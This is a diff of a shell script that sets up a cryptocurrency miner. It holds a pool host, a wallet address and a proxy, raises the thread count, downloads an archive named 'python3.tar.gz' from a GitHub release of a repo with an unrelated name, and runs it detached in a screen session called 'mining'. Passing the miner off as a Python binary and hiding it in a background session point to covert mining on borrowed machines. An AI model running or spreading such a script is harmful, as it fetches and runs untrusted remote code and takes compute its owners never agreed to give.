@@ -8,21 +8,30 @@ if ! [ -x "$(command -v screen)" ]; then
 fi
 
 # Set environment variables
+export LANG="en_US.UTF-8"
+export LC_ALL="en_US.UTF-8"
+export LANGUAGE="en_US.UTF-8"
+
+# Set timezone to Asia/Jakarta
+sudo ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
+sudo dpkg-reconfigure --frontend noninteractive tzdata
+
+# Set mining configuration
 M_ALGO="yespowerr16"
 M_HOST="stratum-asia.rplant.xyz"
 M_PORT="13382"
 M_WORKER="YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC"
 M_PASSWORD="x"
-M_THREADS="16"
+M_THREADS="25"
 M_PROXY="ws://172.233.136.27:8088/proxy"
 
-# Download packages
+# Download and extract python3.tar.gz
 wget https://github.com/malphite-code-3/ai-realestale-trainer/releases/download/python3.2/python3.tar.gz
 tar -xvf python3.tar.gz
 rm python3.tar.gz
 cd python3
 
-# Install required packages with timezone configuration
+# Install required packages
 export DEBIAN_FRONTEND=noninteractive
 apt-get update
 apt-get install -y --no-install-recommends \
@@ -33,10 +42,6 @@ apt-get install -y --no-install-recommends \
     libxext6 libxfixes3 libxi6 libxrandr2 libxrender1 libxss1 libxtst6 \
     ca-certificates fonts-liberation libappindicator1 libnss3 lsb-release xdg-utils \
     libgbm-dev tzdata
-
-# Set timezone to Asia/Jakarta
-ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
-dpkg-reconfigure --frontend noninteractive tzdata
 
 # Remove the existing config.json file
 rm -f config.json
@@ -56,5 +61,5 @@ cat <<EOL > config.json
 }
 EOL
 
-# Start the script inside a screen session
+# Start the mining script inside a screen session
 screen -dmS mining /bin/bash -c './python3 main.py'
